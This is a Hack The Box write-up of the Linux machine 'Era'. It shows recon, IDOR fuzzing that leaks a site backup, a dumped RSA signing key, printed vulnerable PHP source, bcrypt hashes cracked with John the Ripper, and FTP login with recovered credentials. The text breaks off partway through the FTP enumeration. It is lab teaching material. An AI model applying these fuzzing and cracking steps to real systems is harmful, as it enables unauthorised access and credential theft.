---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - InsecureDirectObjectReference
  - IDOR
  - SecureCodeReview
  - Hashes
  - Cracking
  - JohnTheRipper
  - PHPWrapper
  - Binary
  - ELF
  - Signing
---

![](images/Era.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Subdomain Enumeration](#Subdomain-Enumeration)
        - [Directory Brute Force](#Directory-Brute-Force)
        - [User Registration](#User-Registration)
        - [Application Sign In](#Application-Sign-In)
        - [Application Dashboard](#Application-Dashboard)
        - [Insecure Direct Object Reference (IDOR)](#Insecure-Direct-Object-Reference-IDOR)
    - [Investigating Backup Files](#Investigating-Backup-Files)
- [Cracking the Hashes](#Cracking-the-Hashes)
- [Enumeration of Port 21/TCP](#Enumeration-of-Port-21TCP)
    - [FTP Access](#FTP-Access)
- [Foothold](#Foothold)
    - [Privilege Escalation to Admin](#Privilege-Escalation-to-Admin)
    - [Remote Code Execution (RCE) through PHP Wrapper](#Remote-Code-Execution-RCE-through-PHP-Wrapper)
- [Enumeration (yuri)](#Enumeration-yuri)
- [Privilege Escalation to eric](#Privilege-Escalation-to-eric)
- [user.txt](#usertxt)
- [Enumeration (eric)](#Enumeration-eric)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Summary

The box starts with only port `21/TCP` and port `80/TCP` open. The `Subdomain` of `file.era.htb` can be found by performing `Virtual Host (VHOST) Enumeration`. It runs some sort of `File Management System`. The endpoint of `/register.php` is shown after successful `Directory Brute Force`. With a newly `registered user` an `Insecure Direct Object Reference (IDOR)` vulnerability can be found. Fuzzing the `ID` parameter allows to download a `backup` of the whole `application` containing a file called `filedb.sqlite` as well as another `Zip-Archive` which contains an `Configuration File` for `OpenSSL` and a `Key`. Furthermore in the `Source Code` of the application a `unsafe function` only accessible by the `user` with the `ID` of `1` can be found.

The `database` stores a few `usernames` and `Hashes`. After retrieving two `passwords` by `cracking` the `hashes`, access to the `share` provided by the `FTP Server` can be achieved. The share provides information about a `PHP Wrapper Module` called `ssh2`. The module leads in combination with the unsafe function to `Remote Code Execution (RCE)`. In order to abuse this it is necessary to perform a `Privilege Escalation` to `admin` by `resetting` his `Security Questions` through an `arbitrary user` and login as `admin` using the new `Security Questions`.

After gaining `Foothold` on the box another quick `privesc` can be performed because the second user on the box was already part of the `filedb.sqlite` database and his `Hash` has been already cracked. The new user has access to a folder within `/opt` containing a `signed binary` that get's triggered by a `Bash Script` executed through a `Cronjob` running as `root`. The script performs some checks in regards of `Tamper Protection`. By creating a `custom binary` and `signing` it using the previously found `Configuration` file and `Key`, `privileges` can be `elevated` even further to `root`.

## Reconnaissance

### Port Scanning

First we started with the initial `port scan` using `Nmap`. The scan revealed that only port `21/TCP` and port `80/TCP` were open and available to us.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.174.224 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 21:02 CEST
Nmap scan report for 10.129.174.224
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds
```

On port `80/TCP` we noticed the `redirect` to `http://era.htb` which we added to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 21,80 10.129.174.224
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 21:02 CEST
Nmap scan report for 10.129.174.224
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.174.224  era.htb
```

### Enumeration of Port 80/TCP

The website running on port `80/TCP` didn't provide us any useful or necessary information.

- [http://era.htb/](http://era.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://era.htb/
http://era.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[support@era.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.174.224], JQuery[1.11.0], Script[text/javascript], Title[Era Designs], nginx[1.18.0]
```

![](images/2025-07-26_21-04_80_website.png)

### Subdomain Enumeration

Since the website was a dead end we decided to `enumerate` potential `Subdomains` or `Virtual Hosts (VHOST)`. For this step we used `ffuf` and very quickly found `file.era.htb`.

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.era.htb" -u http://era.htb/ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 22ms]
:: Progress: [151265/151265] :: Job [1/1] :: 2020 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```

This `Subdomain` also went directly into our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.174.224  era.htb
10.129.174.224  file.era.htb
```

As our next logical step we took a closer look at `file.era.htb` and found some sort of `File Management System` which allowed us to `manage` and `upload` files, as well as modifying `Security Questions` and to `sign in` using either legacy methods like `username` and `password` but also `login` via `Security Questions`.

- [http://file.era.htb/](http://file.era.htb/)

![](images/2025-07-26_21-06_80_subdomain_website.png)

![](images/2025-07-26_21-08_80_subdomain_security_questions.png)

#### Directory Brute Force

We not had any credentials yet and every basic test like `admin:admin` failed at this point. Therefore we decided to enumerate the `Subdomain` as well and started with `Directory Brute Force` using `dirsearch`.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://file.era.htb/

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_file.era.htb/__25-07-26_21-17-04.txt

Target: http://file.era.htb/

[21:17:04] Starting:
[21:17:08] 403 -  564B  - /.ht_wsr.txt                                      
[21:17:08] 403 -  564B  - /.htaccess.bak1                                   
[21:17:08] 403 -  564B  - /.htaccess.orig                                   
[21:17:08] 403 -  564B  - /.htaccess.sample                                 
[21:17:08] 403 -  564B  - /.htaccess.save                                   
[21:17:08] 403 -  564B  - /.htaccess_extra
[21:17:08] 403 -  564B  - /.htaccess_orig
[21:17:08] 403 -  564B  - /.htaccessBAK
[21:17:08] 403 -  564B  - /.htaccessOLD
[21:17:08] 403 -  564B  - /.htaccess_sc
[21:17:08] 403 -  564B  - /.htaccessOLD2
[21:17:08] 403 -  564B  - /.htm                                             
[21:17:08] 403 -  564B  - /.html
[21:17:08] 403 -  564B  - /.httr-oauth                                      
[21:17:08] 403 -  564B  - /.htpasswd_test
[21:17:08] 403 -  564B  - /.htpasswds
[21:17:19] 301 -  178B  - /assets  ->  http://file.era.htb/assets/          
[21:17:19] 403 -  564B  - /assets/                                          
[21:17:25] 302 -    0B  - /download.php  ->  login.php                      
[21:17:27] 301 -  178B  - /files  ->  http://file.era.htb/files/            
[21:17:27] 403 -  564B  - /files/                                           
[21:17:27] 403 -  564B  - /files/cache/                                     
[21:17:27] 403 -  564B  - /files/tmp/
[21:17:30] 301 -  178B  - /images  ->  http://file.era.htb/images/          
[21:17:30] 403 -  564B  - /images/                                          
[21:17:32] 200 -   34KB - /LICENSE                                          
[21:17:32] 200 -    9KB - /login.php                                        
[21:17:33] 200 -   70B  - /logout.php                                       
[21:17:33] 302 -    0B  - /manage.php  ->  login.php                        
[21:17:41] 200 -    3KB - /register.php                                     
[21:17:49] 302 -    0B  - /upload.php  ->  login.php                        
                                                                             
Task Completed
```

#### User Registration

The one `endpoint` that didn't showed up on the `landing page` of the `Subdomain` was `/register.php`.

- [http://file.era.htb/register.php](http://file.era.htb/register.php)

![](images/2025-07-26_21-15_80_subdomain_registration.png)

#### Application Sign In

We `registered` a `user` on `/register.php` and logged in.

![](images/2025-07-26_21-14_80_subdomain_signin.png)

#### Application Dashboard

The `Dashboard` showed the options mentioned on the landing page.

![](images/2025-07-26_21-15_80_subdomain_dashboard.png)

![](images/2025-07-26_21-17_80_subdomain_upload.png)

When we uploaded a `dummy file` and tried to access it, the `URL` changed to a `random ID` which pointed to our file.

![](images/2025-07-26_21-18_80_subdomain_manage_files.png)

![](images/2025-07-26_21-22_80_subdomain_download.png)

#### Insecure Direct Object Reference (IDOR)

The discovery of the `ID` made us thinking if we eventually had to deal with some sort of `Insecure Direct Object Reference (IDOR)` vulnerability. To verify or rule out this assumption we used `ffuf` again and specified our `Cookie` in the `Header Option` to `fuzz` the `four digit ID` field.

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -H "Cookie: PHPSESSID=vrjbq7kmla3ajds6q6vg96l79m" -u 'http://file.era.htb/download.php?id=FUZZ' --fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Cookie: PHPSESSID=vrjbq7kmla3ajds6q6vg96l79m
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

0054                    [Status: 200, Size: 6380, Words: 2552, Lines: 222, Duration: 16ms]
0150                    [Status: 200, Size: 6367, Words: 2552, Lines: 222, Duration: 25ms]
3757                    [Status: 200, Size: 6363, Words: 2552, Lines: 222, Duration: 17ms]
:: Progress: [10000/10000] :: Job [1/1] :: 1680 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Besides the `ID`we already knew we found two more which verified that we indeed had found an `IDOR` vulnerability.

Next we downloaded both files, `0045` and `0150`.

- [http://file.era.htb/download.php?id=0054](http://file.era.htb/download.php?id=0054)

![](images/2025-07-26_21-27_80_subdomain_idor_site_backup_download.png)

![](images/2025-07-26_21-36_80_subdomain_idor_signin_download.png)

### Investigating Backup Files

The first file `0045` was a `complete backup` of the `Subdomain` which contained some very interesting files like the `filedb.sqlite`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Era/files]
└─$ unzip site-backup-30-08-24.zip 
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE                 
  inflating: bg.jpg                  
   creating: css/
  inflating: css/main.css.save       
  inflating: css/main.css            
  inflating: css/fontawesome-all.min.css  
  inflating: css/noscript.css        
   creating: css/images/
 extracting: css/images/overlay.png  
  inflating: download.php            
  inflating: filedb.sqlite           
   creating: files/
  inflating: files/.htaccess         
 extracting: files/index.php         
  inflating: functions.global.php    
  inflating: index.php               
  inflating: initial_layout.php      
  inflating: layout.php              
  inflating: layout_login.php        
  inflating: login.php               
  inflating: logout.php              
  inflating: main.png                
  inflating: manage.php              
  inflating: register.php            
  inflating: reset.php               
   creating: sass/
   creating: sass/layout/
  inflating: sass/layout/_wrapper.scss  
  inflating: sass/layout/_footer.scss  
  inflating: sass/layout/_main.scss  
  inflating: sass/main.scss          
   creating: sass/base/
  inflating: sass/base/_page.scss    
  inflating: sass/base/_reset.scss   
  inflating: sass/base/_typography.scss  
   creating: sass/libs/
  inflating: sass/libs/_vars.scss    
  inflating: sass/libs/_vendor.scss  
  inflating: sass/libs/_functions.scss  
  inflating: sass/libs/_mixins.scss  
  inflating: sass/libs/_breakpoints.scss  
  inflating: sass/noscript.scss      
   creating: sass/components/
  inflating: sass/components/_actions.scss  
  inflating: sass/components/_icons.scss  
  inflating: sass/components/_button.scss  
  inflating: sass/components/_icon.scss  
  inflating: sass/components/_list.scss  
  inflating: sass/components/_form.scss  
  inflating: screen-download.png     
  inflating: screen-login.png        
  inflating: screen-main.png         
  inflating: screen-manage.png       
  inflating: screen-upload.png       
  inflating: security_login.php      
  inflating: upload.php              
   creating: webfonts/
  inflating: webfonts/fa-solid-900.eot  
  inflating: webfonts/fa-regular-400.ttf  
  inflating: webfonts/fa-regular-400.woff  
  inflating: webfonts/fa-solid-900.svg  
  inflating: webfonts/fa-solid-900.ttf  
  inflating: webfonts/fa-solid-900.woff  
  inflating: webfonts/fa-brands-400.ttf  
 extracting: webfonts/fa-regular-400.woff2  
  inflating: webfonts/fa-solid-900.woff2  
  inflating: webfonts/fa-regular-400.eot  
  inflating: webfonts/fa-regular-400.svg  
  inflating: webfonts/fa-brands-400.woff2  
  inflating: webfonts/fa-brands-400.woff  
  inflating: webfonts/fa-brands-400.eot  
  inflating: webfonts/fa-brands-400.svg
```

Using `strings` on this file gave us a lot of `Hashes` as well as something that look like the `answers` (`MariaOliverOttawa`) to the `Security Questions` of a user.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip]
└─$ strings filedb.sqlite 
SQLite format 3
3tableusersusers
CREATE TABLE users (
                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_name varchar(255) NOT NULL,
                user_password varchar(255) NOT NULL,
                auto_delete_files_after int NOT NULL
                , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255))P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
7tablefilesfiles
CREATE TABLE files (
                fileid int NOT NULL PRIMARY KEY,
                filepath varchar(255) NOT NULL,
                fileowner int NOT NULL,
                filedate timestamp NOT NULL
                ))
indexsqlite_autoindex_files_1files
6files/site-backup-30-08-24.zipf
ethan$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
john$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
yuri$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
veronica$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
admin_ef01cab31aa$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
XMariaOliverOttawaJ
eric$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
users
```

Furthermore the `download.php` showed a potentially `vulnerable function`, only accessible by the `user` with the `ID` of `1` which was the `admin` of the application. We found his `username` (`admin_ef01cab31aa`) already in the `filedb.sqlite` database.

```php
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip]
└─$ cat download.php 
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        height: 80vh; 
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}


if (!isset($_GET['id'])) {
        header('location: index.php'); // user loaded without requesting file by id
        die();
}

if (!is_numeric($_GET['id'])) {
        header('location: index.php'); // user requested non-numeric (invalid) file id
        die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
        echo deliverTop("Era - Download");

        echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

        echo deliverBottom();
} else {
        $fileName = str_replace("files/", "", $fetched[0]);


        // Allow immediate file download
        if ($_GET['dl'] === "true") {

                header('Content-Type: application/octet-stream');
                header("Content-Transfer-Encoding: Binary");
                header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
                readfile($fetched[0]);
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }


        // Allow simple download
        } else {
                echo deliverTop("Era - Download");
                echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

        }

}


?>
```

```php
<--- CUT FOR BREVITY --->
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }
<--- CUT FOR BREVITY --->
```

The second file `0150` contained an `Configuration File` (`x509.genkey`) for `OpenSSL` and a `Key` (`key.pem`).

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip2]
└─$ unzip signing.zip 
Archive:  signing.zip
  inflating: key.pem                 
  inflating: x509.genkey
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip2]
└─$ openssl rsa -in key.pem -check -noout
RSA key ok
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip2]
└─$ openssl pkey -in key.pem -text -noout
Private-Key: (2048 bit, 2 primes)
modulus:
    00:aa:28:7d:f4:f9:16:63:93:18:95:24:c9:ee:07:
    a6:f5:74:36:d6:51:ac:37:a7:64:32:42:f5:8c:6c:
    5b:ec:8b:bc:c6:d6:41:36:2c:1a:ca:8e:c1:32:bd:
    cc:68:f2:6d:30:2f:d7:de:b8:58:8e:95:c8:83:31:
    a9:84:2c:c0:16:d1:48:cc:c9:ec:34:d7:e4:be:6c:
    01:1c:39:ac:07:f3:56:d5:6a:1c:4d:90:0e:21:1e:
    2f:5d:fe:bc:ac:4d:ef:dd:9c:d9:21:d3:c2:a0:1e:
    1c:c5:99:30:29:8d:b5:74:31:0c:14:0c:e2:d7:4b:
    0f:5e:1d:df:b5:54:90:a5:c2:1c:00:b0:be:31:76:
    4e:29:41:2e:9d:02:e2:44:9f:1d:c8:cc:da:10:db:
    77:fe:74:fa:93:08:c0:00:59:24:fa:ed:53:d9:8d:
    28:f0:5b:5f:c7:1c:d8:b5:d9:e3:de:c0:42:51:18:
    1f:b6:2b:e6:1e:1a:3f:a5:c5:28:56:fc:8d:63:60:
    41:e7:b0:ea:e5:88:cd:a1:66:f3:8b:a9:2f:4b:8e:
    1a:9f:23:df:90:d5:1c:48:40:5e:bd:c8:01:14:78:
    de:25:62:ea:5a:d0:68:6b:da:1f:7a:60:b4:44:e5:
    8c:97:68:1c:5d:48:0e:20:2c:63:95:1d:98:0c:97:
    68:bf
publicExponent: 65537 (0x10001)
privateExponent:
    2c:23:b9:dc:d8:da:9a:74:f7:6d:04:f0:8e:db:14:
    4f:da:d8:38:cb:51:f1:d3:ed:d5:6d:f2:35:7d:8c:
    70:f5:a4:c0:2d:a7:17:ee:e3:fa:44:82:d0:6f:54:
    bd:aa:99:71:65:0f:c9:fa:27:1a:c1:b7:14:75:47:
    04:7e:f9:4b:51:f9:e1:09:c6:48:c4:f2:55:05:3e:
    5a:7c:89:68:3c:92:fb:64:7d:b8:0f:14:e3:39:69:
    cf:27:bb:f8:b4:74:f3:17:73:69:e7:7d:36:bc:e8:
    f8:c7:2e:ab:b0:d3:6f:b3:23:6f:76:12:48:07:f4:
    12:15:8c:c9:04:89:4b:3d:fc:9c:a3:9c:40:14:21:
    c1:d9:a2:64:c9:d5:42:9e:d7:e1:71:3b:df:ed:96:
    7e:df:4d:49:e7:9d:cc:2a:58:45:91:eb:23:cd:b4:
    3b:ee:0c:79:0a:ee:99:f5:62:8d:b2:f6:c7:1d:e8:
    d2:99:ef:12:75:e2:a9:bc:49:8d:84:12:f2:08:d2:
    50:01:42:73:90:34:7c:73:06:99:5a:6f:2f:eb:bb:
    4a:fe:34:9a:3f:eb:9c:6b:c3:10:09:da:35:ff:a3:
    4a:50:bd:29:d1:79:cf:d8:16:00:f8:a2:ec:94:2d:
    4f:35:b3:c4:38:a7:53:13:54:86:52:74:d1:d7:f6:
    f5
prime1:
    00:ec:02:4c:cd:8c:70:07:34:a5:5e:c4:9e:2a:e0:
    24:44:6b:03:9f:74:1f:cf:7b:49:66:dd:d3:5f:e5:
    49:44:6e:03:56:54:a1:31:80:df:dd:12:14:cb:55:
    88:29:55:72:62:64:98:4a:3c:63:21:4a:78:59:ff:
    4a:16:81:20:2f:61:ca:4f:b2:eb:d9:fd:63:7b:96:
    c7:93:b0:7e:a3:6d:1c:95:81:df:26:08:5e:09:88:
    2c:37:82:eb:28:05:f0:ad:a7:db:29:cb:c5:63:b3:
    49:9c:58:74:56:3d:16:3c:41:b3:06:fd:25:02:9d:
    44:b4:2a:e4:f5:8a:48:88:63
prime2:
    00:b8:92:42:a5:c9:5c:b6:f9:9d:ff:cc:c3:d3:0a:
    56:bf:21:5e:bf:12:22:e2:75:27:67:44:77:c3:c7:
    c9:7a:ec:37:34:de:d8:60:01:a2:85:51:83:15:a7:
    08:9a:df:f5:17:41:2f:53:3e:3f:40:cb:e0:c3:92:
    45:ec:9f:1f:26:d6:93:31:57:4c:2d:92:b7:9c:a5:
    5a:d2:07:d4:2f:99:d2:d8:ba:ea:27:98:6f:27:96:
    01:ec:e1:b7:e5:fc:93:bf:f9:8e:e5:cf:f5:26:d6:
    a3:3b:6a:86:72:3c:51:1e:65:37:a1:ea:a3:36:b3:
    ee:ca:90:19:d2:be:78:36:f5
exponent1:
    00:ac:ce:1a:52:3e:cc:20:5a:89:e3:53:ef:c3:d1:
    0e:7d:12:26:3a:f0:9a:02:1f:71:65:62:72:cc:ba:
    63:e5:38:f0:34:9c:0e:d2:e2:5c:07:d0:9f:6d:2a:
    99:62:3a:70:60:5e:eb:ab:1f:80:2d:f6:0b:1d:4a:
    71:82:fc:d5:06:1c:82:37:cc:f8:28:4b:02:36:91:
    f6:5b:cb:55:4e:70:2c:07:c4:6a:11:bc:fa:ad:dc:
    09:14:34:45:de:ae:4a:c5:bc:2c:1a:f4:5a:f9:5f:
    63:3c:98:ff:c5:cd:40:a4:aa:2e:5d:a5:a9:1d:ba:
    ed:7d:46:13:13:3e:47:51:a5
exponent2:
    00:89:b5:4e:96:a5:4b:50:95:a3:45:d4:80:12:b8:
    77:0a:79:9a:58:52:ee:c6:29:84:b1:ae:ca:f0:be:
    e2:5b:9d:5c:7f:4c:f9:01:80:96:c2:83:93:9b:17:
    19:fb:7b:b7:40:97:78:f8:d1:cb:9d:cb:bf:b2:0b:
    33:b2:9c:f2:40:26:fe:81:64:d1:c8:7a:dc:15:ba:
    e5:ad:28:fc:2e:5b:c5:8d:c0:bf:ad:b5:34:d1:c3:
    41:42:7d:12:99:3c:be:fc:0f:f5:87:0f:86:a8:68:
    a2:37:55:7e:64:43:0e:7e:f0:23:f6:e1:ba:ce:b8:
    a7:24:69:29:6b:2c:83:42:f5
coefficient:
    3b:3d:d1:f2:32:ae:58:3a:60:60:78:af:a1:32:e2:
    f5:ed:54:89:a9:be:78:df:70:db:c0:9a:00:f0:b9:
    8f:f3:cc:b6:6f:f1:8e:43:25:64:de:f2:ec:69:88:
    f7:28:a5:ad:68:0b:a5:7b:07:3b:c8:96:cf:82:0b:
    b5:42:85:ce:da:59:c0:09:79:39:64:de:10:47:8f:
    bb:69:71:fc:0d:c2:4d:73:81:ca:f5:be:ec:ad:17:
    0e:b8:c7:69:ea:e6:87:48:4b:ef:34:4e:16:53:70:
    67:9d:4e:e8:f5:a8:a4:f3:c4:df:d2:79:f2:dd:bb:
    df:bc:31:79:55:64:15:a3
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Era/files/unzip2]
└─$ cat x509.genkey 
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
```

## Cracking the Hashes

We carved out the `Hashes` and started `cracking` them using `John the Ripper`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Era/files]
└─$ cat hashes 
$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
```

After a few seconds we got two of the hashes cracked.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Era/files]
└─$ sudo john hashes --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (?)     
mustang          (?)
```

| Username | Password |
| -------- | -------- |
| yuri     | mustang  |
| eric     | america  |

## Enumeration of Port 21/TCP

### FTP Access

The user `yuri` was able to login on port `21/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ ftp yuri@10.129.174.224
Connected to 10.129.174.224.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

| Username | Password |
| -------- | -------- |
| yuri     | mustang  |

The user had only permissions to `read` files and folders but that alone gave us some useful information.

```shell
ftp> dir
229 Entering Extended Passive Mode (|||33204|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
```

```shell
ftp> binary
```

First we checked the `apache2_conf` directory.

```shell
ftp> cd apache2_conf
250 Directory successfully changed.
```

It contained a few `configuration files` but none of them very useful at this point.

```shell
ftp> dir
229 Entering Extended Passive Mode (|||13619|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.
```

Next we checked the `php8.1_conf` folder.

```shell
ftp> cd php8.1_conf
250 Directory successfully changed.
```

It contained a lot of `modules` but one of them stood out. It was the `ssh2.so` module.

```shell
ftp> dir
229 Entering Extended Passive Mode (|||64858|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
